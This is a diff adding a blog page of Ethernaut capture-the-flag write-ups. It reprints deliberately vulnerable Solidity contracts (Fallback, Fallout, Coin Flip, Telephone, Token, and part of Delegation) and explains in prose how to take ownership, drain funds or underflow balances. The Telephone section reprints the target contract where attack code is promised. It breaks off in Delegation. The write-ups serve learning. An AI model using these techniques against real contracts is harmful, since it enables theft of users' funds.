@@ -1,0 +1,1582 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Ethernaut CTF WriteUps </title>
+  <meta name="description" content="Building n Breaking">
+
+  <!-- Social: Twitter -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@D4r3_D3v1L_">
+  <meta name="twitter:title" content="Ethernaut CTF WriteUps ">
+  <meta name="twitter:description" content="Building n Breaking">
+  
+  <meta property="twitter:image:src" content="http://localhost:4000/potato-hacker-theme/assets/img/opengraph.png">
+  
+
+  <!-- Social: Facebook / Open Graph -->
+  <meta property="og:url" content="http://localhost:4000/potato-hacker-theme/blog/2023/01/20/Ethernaut.html">
+  <meta property="og:title" content="Ethernaut CTF WriteUps ">
+  
+  <meta property="og:image" content="http://localhost:4000/potato-hacker-theme/assets/img/opengraph.png">
+  
+  <meta property="og:description" content="Building n Breaking">
+  <meta property="og:site_name" content="jekyll-theme-potato-hacker">
+
+  <!-- Social: Schema.org  -->
+  <meta itemprop="name" content="Ethernaut CTF WriteUps "/>
+  <meta itemprop="description" content="Building n Breaking">
+  <meta itemprop="image" content="http://localhost:4000/potato-hacker-theme/assets/img/opengraph.png"/>
+
+  <!-- Favicon -->
+  <link rel="shortcut icon" href="/potato-hacker-theme/assets/img/icons/favicon.ico" type="image/x-icon" />
+
+  <!-- Android Lolipop Theme Color -->
+  <meta name="theme-color" content="#2a4d14">
+
+  <!-- Styles -->
+  <link rel="stylesheet" id="css-theme" href="/potato-hacker-theme/assets/css/main-dark.css">
+  <link rel="stylesheet" href="/potato-hacker-theme/assets/css/highlight/gruvbox.css">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+  <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet">
+
+  <!-- Javascript -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/4.3.0/d3.min.js"></script>
+  <script type="text/javascript" src="/potato-hacker-theme/assets/js/main.js"></script>
+</head>
+
+
+<body class="animated fadeIn">
+  <div class="container">
+    <div id="background-div">
+      <svg id="background-svg">
+        <lineargradient id="Gradient1" x1="0" x2="0" y1="0" y2="1">
+          <stop stop-opacity="0" class="bgColor2" offset="0%" />
+          <stop stop-opacity="0.5" class="bgColor2" offset="10%" />
+          <stop stop-opacity="0.5" class="bgColor1" offset="40%" />
+          <stop stop-opacity="0" class="bgColor1" offset="100%" />
+        </lineargradient>
+        <g id="bg-layer1"></g>
+        <g id="bg-layer2" class="hide"></g>
+        <g id="bg-layer3"></g>
+        <g id="bg-layer4"></g>
+      </svg>
+    </div>
+    <section class="header">
+      <header>
+	<div class="row">
+		<div class="col-xs-12">
+			<nav class="navbar navbar-default navbar-fixed-top">
+				<div class="container">
+					<div class="navbar-header">
+						<a
+							class="navbar-toggle collapsed navbar-icon"
+							data-toggle="collapse"
+							data-target="#bs-example-navbar-collapse-1"
+						>
+							<i class="fa fa-bars fa-2x"></i>
+						</a>
+						<a
+							class="navbar-brand navbar-icon"
+							href="/potato-hacker-theme/"
+						>
+							<i class="fa fa-home fa-2x"></i>
+						</a>
+					</div>
+
+					<div
+						class="collapse navbar-collapse"
+						id="bs-example-navbar-collapse-1"
+					>
+						<ul class="nav navbar-nav navbar-right">
+							<li>
+								<a href="/potato-hacker-theme/"
+									>Home</a
+								>
+							</li>
+							
+							<li>
+								<a href="/potato-hacker-theme/blog"
+									>Blog</a
+								>
+							</li>
+							
+
+							<!-- 
+                <li class="dropdown dropdown-dropdown1">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown1
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item1">
+                    <li priority="1"><a href="/potato-hacker-theme/dropdown/dropdown1_item1.html">item1</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown1">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown1
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item2">
+                    <li priority="2"><a href="/potato-hacker-theme/dropdown/dropdown1_item2.html">item2</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown1">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown1
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item3">
+                    <li priority="3"><a href="/potato-hacker-theme/dropdown/dropdown1_item3.html">item3</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown2">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown2
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item1">
+                    <li priority=""><a href="/potato-hacker-theme/dropdown/dropdown2_item1.html">item1</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown2">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown2
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item2">
+                    <li priority=""><a href="/potato-hacker-theme/dropdown/dropdown2_item2.html">item2</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown3">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown3
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item1">
+                    <li priority=""><a href="/potato-hacker-theme/dropdown/dropdown3_item1.html">item1</a></li>
+                  </ul>
+                </li>
+               -->
+							
+							<li class="nav-item">
+								<a
+									href="/potato-hacker-theme/items/about.html"
+									>About</a
+								>
+							</li>
+							
+
+							<script>
+								// clean repeated dropdowns and add <li> to their positions
+								let done = [];
+								let elements = [];
+								$(".dropdown")
+								  //
+								  .each((index0 , value0) => {
+								    let dropdownClass = "."+$(value0)[0].classList[1];
+								    if (done.indexOf(dropdownClass) !== -1) return
+								    done.push(dropdownClass)
+								    let dropdownMain = $(dropdownClass)[0]
+								    let itemsList = $(dropdownClass+">ul>li").sort((a, b) => parseInt(b.getAttribute("priority") || -9999999) - parseInt(a.getAttribute("priority") || -9999999))
+								    $(dropdownClass+">ul>li").remove();
+								    $(dropdownClass+">ul").append(itemsList)
+								    $(dropdownClass).remove();
+								    elements.push(dropdownMain)
+								});
+								let priority = [ "About", ];
+								elements = elements.concat(...$(".nav-item").remove())
+								priority.map(text => {
+								  elements = elements.filter(node => {
+								      let nodeText = node.querySelector("a").textContent.trim()
+								      if (text == nodeText) {
+								          $(".nav").append(node)
+								          return false;
+								      }
+								      return true;
+								  })
+								});
+								$(".nav").append(elements)
+							</script>
+						</ul>
+					</div>
+				</div>
+			</nav>
+		</div>
+	</div>
+</header>
+
+    </section>
+    <section class="content">
+      <div class="row">
+        <!-- <div class="col-sm-2">
+          <div class="pane-separator hidden-xs" style="margin-bottom:30em;"></div>
+          <div class="left-pane">
+          </div>
+        </div> -->
+        <div class="col-sm-8 col-sm-offset-2 content-div">
+          <div class="page-separator hidden-xs">
+            <h1 class="h1-strip" style="padding-bottom:8em; margin-bottom: 0;"></h1>
+          </div>
+          <div class="page-separator visible-xs">
+            <h1 class="h1-strip" style="padding-bottom:2em; margin-bottom: 0;"></h1>
+          </div>
+          <h1 class="post-title page-title" id="title"><a href="#title">Ethernaut CTF WriteUps </a></h1>
+          <h4 class="post-title"> 2023-01-20 15:37:12 +0530 </h4>
+<article class="blog-post">
+  <p>My first Blockchain CTF WriteUps</p>
+
+<!--more-->
+
+<h2 id="1-fallback">1 Fallback</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">Fallback</span> <span class="p">{</span>
+  <span class="k">using</span> <span class="n">SafeMath</span> <span class="k">for</span> <span class="kt">uint256</span><span class="p">;</span>
+  <span class="k">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="k">public</span> <span class="n">contributions</span><span class="p">;</span>
+  <span class="kt">address</span> <span class="k">payable</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+  <span class="k">constructor</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+	<span class="n">owner</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+	<span class="n">contributions</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1000</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">modifier</span> <span class="n">onlyOwner</span> <span class="p">{</span>
+		<span class="nb">require</span><span class="p">(</span>
+			<span class="n">msg</span><span class="p">.</span><span class="n">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">,</span>
+			<span class="s">"caller is not the owner"</span>
+		<span class="p">);</span>
+		<span class="n">_</span><span class="p">;</span>
+	<span class="p">}</span>
+  <span class="k">function</span> <span class="n">contribute</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
+	<span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span> <span class="o">&lt;</span> <span class="mf">0.001</span> <span class="kc">ether</span><span class="p">);</span>
+	<span class="n">contributions</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">contributions</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">contributions</span><span class="p">[</span><span class="n">owner</span><span class="p">])</span> <span class="p">{</span>
+	  <span class="n">owner</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+	<span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">getContribution</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">return</span> <span class="n">contributions</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">];</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">withdraw</span><span class="p">()</span> <span class="k">public</span> <span class="n">onlyOwner</span> <span class="p">{</span>
+	<span class="n">owner</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+	<span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">contributions</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="n">owner</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this level we need to become contract owner and transfer all the funds of the contract.</p>
+
+<p>We have a fallback function here,</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+	<span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">contributions</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="n">owner</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+ <span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>A fallback function is called every time a contract receives ether or an unknown method is called.
+So by sending some ether to the contract we can trigger the fallback function but there’s a condition</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>So first call the contribute function with less than 0.001 ether, that will add a contribution for msg.sende.</p>
+  </li>
+  <li>
+    <p>Now send some ether to the contract this will trigger fallback and make you owner of the contract.</p>
+  </li>
+  <li>
+    <p>Finally call the withdraw function to transfer all the funds from the contract.</p>
+  </li>
+</ul>
+
+<hr />
+
+<h2 id="2-fallout">2 Fallout</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">Fallout</span> <span class="p">{</span>
+
+  <span class="k">using</span> <span class="n">SafeMath</span> <span class="k">for</span> <span class="kt">uint256</span><span class="p">;</span>
+  <span class="k">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="n">allocations</span><span class="p">;</span>
+  <span class="kt">address</span> <span class="k">payable</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+  <span class="cm">/* constructor */</span>
+  <span class="k">function</span> <span class="n">Fal1out</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
+	<span class="n">owner</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+	<span class="n">allocations</span><span class="p">[</span><span class="n">owner</span><span class="p">]</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">modifier</span> <span class="n">onlyOwner</span> <span class="p">{</span>
+			<span class="nb">require</span><span class="p">(</span>
+				<span class="n">msg</span><span class="p">.</span><span class="n">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">,</span>
+				<span class="s">"caller is not the owner"</span>
+			<span class="p">);</span>
+			<span class="n">_</span><span class="p">;</span>
+		<span class="p">}</span>
+  <span class="k">function</span> <span class="n">allocate</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
+	<span class="n">allocations</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">allocations</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">].</span><span class="n">add</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">sendAllocation</span><span class="p">(</span><span class="kt">address</span> <span class="k">payable</span> <span class="n">allocator</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+	<span class="nb">require</span><span class="p">(</span><span class="n">allocations</span><span class="p">[</span><span class="n">allocator</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="n">allocator</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">allocations</span><span class="p">[</span><span class="n">allocator</span><span class="p">]);</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">collectAllocations</span><span class="p">()</span> <span class="k">public</span> <span class="n">onlyOwner</span> <span class="p">{</span>
+	<span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">allocatorBalance</span><span class="p">(</span><span class="kt">address</span> <span class="n">allocator</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">return</span> <span class="n">allocations</span><span class="p">[</span><span class="n">allocator</span><span class="p">];</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this challenge you need to become the owner of the contract.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kd">function</span> <span class="nx">Fal1out</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
+	<span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+	<span class="nx">allocations</span><span class="p">[</span><span class="nx">owner</span><span class="p">]</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>As you can see the letter l is changed to 1 so it’s not a constructor .</li>
+  <li>We can call this function and claim the ownership</li>
+</ul>
+
+<hr />
+
+<h2 id="3-coin-flip">3 Coin Flip</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">CoinFlip</span> <span class="p">{</span>
+  <span class="k">using</span> <span class="n">SafeMath</span> <span class="k">for</span> <span class="kt">uint256</span><span class="p">;</span>
+  <span class="kt">uint256</span> <span class="k">public</span> <span class="n">consecutiveWins</span><span class="p">;</span>
+  <span class="kt">uint256</span> <span class="n">lastHash</span><span class="p">;</span>
+  <span class="kt">uint256</span> <span class="n">FACTOR</span> <span class="o">=</span> <span class="mi">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>
+  <span class="k">constructor</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+	<span class="n">consecutiveWins</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">flip</span><span class="p">(</span><span class="kt">bool</span> <span class="n">_guess</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">uint256</span> <span class="n">blockValue</span> <span class="o">=</span> <span class="kt">uint256</span><span class="p">(</span><span class="nb">blockhash</span><span class="p">(</span><span class="n">block</span><span class="p">.</span><span class="n">number</span><span class="p">.</span><span class="n">sub</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">lastHash</span> <span class="o">==</span> <span class="n">blockValue</span><span class="p">)</span> <span class="p">{</span>
+	  <span class="nb">revert</span><span class="p">();</span>
+	<span class="p">}</span>
+	<span class="n">lastHash</span> <span class="o">=</span> <span class="n">blockValue</span><span class="p">;</span>
+	<span class="kt">uint256</span> <span class="n">coinFlip</span> <span class="o">=</span> <span class="n">blockValue</span><span class="p">.</span><span class="n">div</span><span class="p">(</span><span class="n">FACTOR</span><span class="p">);</span>
+	<span class="kt">bool</span> <span class="n">side</span> <span class="o">=</span> <span class="n">coinFlip</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">?</span> <span class="nb">true</span> <span class="o">:</span> <span class="nb">false</span><span class="p">;</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">side</span> <span class="o">==</span> <span class="n">_guess</span><span class="p">)</span> <span class="p">{</span>
+	  <span class="n">consecutiveWins</span><span class="o">++</span><span class="p">;</span>
+	  <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+	  <span class="n">consecutiveWins</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	  <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+	<span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this challenge you need to guess the coinflip outcome consecutively for 10 times .</p>
+
+<p>If you see the flip function there’s a condition that checks for blockhash.</p>
+
+<p>The blockhash is a function which returns the hash of the block number in bytes32.</p>
+
+<p>And the blockvalue is comparing to the lasthash .</p>
+
+<ul>
+  <li>For this we need to create a another contract and inherit this contract in it .</li>
+  <li>
+    <p>Now if we call the the function flip from the another contract the blockhash will be same , then the side value will be same ,so we can call the flip function from challange contract with that value .</p>
+  </li>
+  <li>Call this function 10 times individually other wise the function call will occur in same block and the blockvalue and lasthash will be equal.</li>
+</ul>
+
+<hr />
+
+<h2 id="4-telephone">4 Telephone</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">Telephone</span> <span class="p">{</span>
+  <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+  <span class="k">constructor</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+	<span class="n">owner</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">changeOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">tx</span><span class="p">.</span><span class="n">origin</span> <span class="o">!=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">)</span> <span class="p">{</span>
+	  <span class="n">owner</span> <span class="o">=</span> <span class="n">_owner</span><span class="p">;</span>
+	<span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this challenge we need to claim the ownership of the contract.</p>
+
+<p>There is a changeowner function that will change the owner with a check.</p>
+
+<p>The check ` if (tx.origin != msg.sender)`
+tx.origin gives the address of the account that initiates the first transaction.</p>
+
+<p>msg.sender gives the address of the immediate transaction address.</p>
+
+<p>To solve this we need a external contract , so we can initiate the function call which is tx.origin and in contract we call the function to call the changeowner function in original contract.
+And the contract address will be msg.sender</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: GPL-3.0
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">Telephone</span> <span class="p">{</span>
+  <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+  <span class="k">constructor</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+	<span class="n">owner</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">changeOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">tx</span><span class="p">.</span><span class="n">origin</span> <span class="o">!=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">)</span> <span class="p">{</span>
+	  <span class="n">owner</span> <span class="o">=</span> <span class="n">_owner</span><span class="p">;</span>
+	<span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>It passes the check and We get the ownership.</li>
+</ul>
+
+<hr />
+
+<h2 id="5-token">5 Token</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">Token</span> <span class="p">{</span>
+  <span class="k">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="n">balances</span><span class="p">;</span>
+  <span class="kt">uint</span> <span class="k">public</span> <span class="n">totalSupply</span><span class="p">;</span>
+  <span class="k">constructor</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_initialSupply</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+	<span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">totalSupply</span> <span class="o">=</span> <span class="n">_initialSupply</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_value</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nb">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">-</span> <span class="n">_value</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_value</span><span class="p">;</span>
+	<span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="n">_value</span><span class="p">;</span>
+	<span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="nb">balance</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">return</span> <span class="n">balances</span><span class="p">[</span><span class="n">_owner</span><span class="p">];</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>We given a simple token contract , to solve this challange we need to get extra amount of tokens than we have.</p>
+
+<p><code class="language-plaintext highlighter-rouge">balances[msg.sender] - _value &gt;= 0</code></p>
+
+<p>There’s a underflow condition in the transfer function.</p>
+
+<ul>
+  <li>
+    <p>If we subtract a larger number from smaller one we will get a very large number.</p>
+  </li>
+  <li>
+    <p>We given 20 tokens, so call transfer function with any valid address and a number greater than 20.</p>
+  </li>
+</ul>
+
+<h2 id="6-delegation">6 Delegation</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="k">contract</span> <span class="n">Delegate</span> <span class="p">{</span>
+  <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+  <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+	<span class="n">owner</span> <span class="o">=</span> <span class="n">_owner</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="n">pwn</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+	<span class="n">owner</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">contract</span> <span class="n">Delegation</span> <span class="p">{</span>
+  <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
